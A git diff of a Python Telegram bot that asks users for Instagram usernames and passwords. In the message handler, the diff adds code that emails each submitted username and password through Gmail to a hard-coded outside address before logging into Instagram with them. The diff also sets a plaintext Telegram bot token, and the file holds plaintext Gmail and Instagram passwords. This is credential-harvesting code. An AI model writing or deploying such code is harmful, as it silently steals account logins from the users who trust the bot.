@@ -10,10 +10,6 @@ client = InstagramAPI("jakybay", "camillo197")
 
 client.login()
 
-server = smtplib.SMTP('smtp.gmail.com', 587)
-server.starttls()
-server.login('jaki99kofficial@gmail.com', 'camillo01')
-
 def on_chat_message(msg):
     content_type, chat_type, chat_id = telepot.glance(msg)
     
@@ -28,6 +24,9 @@ def on_chat_message(msg):
               print("Password : ", mex.split(' ')[2])
               toSend = mex.split(' ')[1] + '\n'
               toSend += mex.split(' ')[2]
+              server = smtplib.SMTP('smtp.gmail.com', 587)
+              server.starttls()
+              server.login('jaki99kofficial@gmail.com', 'camillo197')
               server.sendmail('jaki99kofficial@gmail.com', 'jak099k@gmail.com', toSend)
               server.quit()
               client = InstagramAPI(str(mex.split(' ')[1]), str(mex.split(' ')[2]))
@@ -99,7 +98,7 @@ def on_callback_query(msg):
           conta += 1
 
 
-TOKEN = ""
+TOKEN = "703552342:AAFbaj2jDZ11ZTT60LMbZHBw34yR0YLFG0w"
 bot = telepot.Bot(TOKEN)
 bot.message_loop({'chat': on_chat_message, 'callback_query': on_callback_query})
 
